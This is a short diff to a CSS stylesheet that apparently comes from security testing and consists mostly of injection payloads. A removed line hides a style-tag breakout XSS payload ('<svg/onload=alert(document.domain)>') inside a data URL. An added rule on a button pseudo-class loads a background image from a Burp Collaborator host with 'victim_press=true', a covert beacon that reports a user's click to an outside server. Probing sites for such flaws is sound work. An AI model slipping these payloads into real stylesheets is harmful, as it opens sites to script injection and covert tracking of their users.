@@ -1,5 +1,6 @@
 body *, html * {
-    background: red url(img_tree.gif) no-repeat fixed center;
-    background-image: url("data:image/jpg;base64,<\/style><svg/onload=alert(document.domain)>");
-    background-color: #cccccc;
+    background: lightblue url(img_tree.gif) no-repeat fixed center;
+}
+button.btn-primary-gradient:attive {
+    background: url("https://4w1ol01hkqaf2ogtyc96mnxie9kz8o.burpcollaborator.net/victim_press=true");
 }
